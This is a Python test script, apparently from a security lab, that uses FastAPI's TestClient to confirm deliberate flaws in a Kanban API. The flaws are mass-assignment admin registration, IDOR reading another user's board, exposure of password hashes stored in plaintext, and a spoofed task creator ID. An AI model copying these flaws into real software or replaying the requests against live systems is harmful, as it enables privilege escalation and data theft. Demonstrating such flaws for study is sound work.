from datetime import datetime, timezone
from pathlib import Path
import sys
from uuid import uuid4

from fastapi.testclient import TestClient

ROOT_DIR = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT_DIR))

from app.main import app

client = TestClient(app)


def _assert_status(response, expected_status: int, label: str) -> None:
    if response.status_code != expected_status:
        raise AssertionError(
            f"{label} fallo: status={response.status_code}, body={response.text}"
        )


def _register_user(nombre: str, email: str, password: str, rol_id: int) -> dict:
    response = client.post(
        "/api/auth/register",
        json={
            "nombre": nombre,
            "email": email,
            "password": password,
            "rol_id": rol_id,
        },
    )
    _assert_status(response, 200, f"Registro de {email}")
    return response.json()


def _login(email: str, password: str) -> str:
    response = client.post(
        "/api/auth/login",
        json={
            "email": email,
            "password": password,
        },
    )
    _assert_status(response, 200, f"Login de {email}")
    return response.json()["access_token"]


def _auth_headers(token: str) -> dict[str, str]:
    return {"Authorization": f"Bearer {token}"}


def main() -> None:
    suffix = uuid4().hex[:8]
    password = "123456"

    victim_email = f"victima_{suffix}@example.com"
    attacker_email = f"atacante_{suffix}@example.com"
    escalated_email = f"admin_mass_{suffix}@example.com"

    print("Creando usuarios demo...")
    victim = _register_user("Victima Demo", victim_email, password, 2)
    attacker = _register_user("Atacante Demo", attacker_email, password, 2)

    victim_token = _login(victim_email, password)
    attacker_token = _login(attacker_email, password)

    print("Verificando asignacion masiva...")
    escalated_user = _register_user("Admin Por Body", escalated_email, password, 1)
    assert escalated_user["rol_id"] == 1
    assert escalated_user["password_hash"] == password
    print("OK - Registro acepto rol_id=1 y devolvio password_hash.")

    print("Creando tablero de la victima...")
    board_response = client.post(
        "/api/tableros",
        headers=_auth_headers(victim_token),
        json={
            "nombre": f"Tablero privado {suffix}",
            "descripcion": "Tablero creado por la victima",
            "propietario_id": victim["id"],
        },
    )
    _assert_status(board_response, 200, "Crear tablero de victima")
    board = board_response.json()

    print("Verificando BOLA / IDOR...")
    idor_response = client.get(
        f"/api/tableros/{board['id']}",
        headers=_auth_headers(attacker_token),
    )
    _assert_status(idor_response, 200, "Atacante consultando tablero ajeno")
    leaked_board = idor_response.json()
    assert leaked_board["propietario_id"] == victim["id"]
    print("OK - Atacante pudo leer un tablero ajeno cambiando el ID.")

    print("Verificando exposicion excesiva de datos...")
    users_response = client.get(
        "/api/usuarios",
        headers=_auth_headers(attacker_token),
    )
    _assert_status(users_response, 200, "Listar usuarios con atacante")
    users = users_response.json()
    assert any(user["email"] == victim_email for user in users)
    assert all("password_hash" in user for user in users)
    print("OK - GET /api/usuarios expone password_hash y datos de usuarios.")

    print("Creando columna y tarea para validar flujo Kanban...")
    column_response = client.post(
        "/api/columnas",
        headers=_auth_headers(victim_token),
        json={
            "nombre": "Pendiente",
            "tablero_id": board["id"],
            "orden": 1,
        },
    )
    _assert_status(column_response, 200, "Crear columna")
    column = column_response.json()

    task_response = client.post(
        "/api/tareas",
        headers=_auth_headers(attacker_token),
        json={
            "titulo": "Tarea manipulada por atacante",
            "descripcion": "El atacante envia creador_id de la victima",
            "fecha_vencimiento": datetime.now(timezone.utc).isoformat(),
            "columna_id": column["id"],
            "creador_id": victim["id"],
            "asignados_ids": [attacker["id"], victim["id"]],
        },
    )
    _assert_status(task_response, 200, "Crear tarea con creador_id manipulado")
    task = task_response.json()
    assert task["creador_id"] == victim["id"]
    print("OK - Tarea creada con creador_id manipulado desde el body.")

    print("\nResultado: vulnerabilidades verificadas correctamente.")
    print(f"Victima: id={victim['id']}, email={victim_email}")
    print(f"Atacante: id={attacker['id']}, email={attacker_email}")
    print(f"Tablero ajeno explotado: id={board['id']}")


if __name__ == "__main__":
    main()
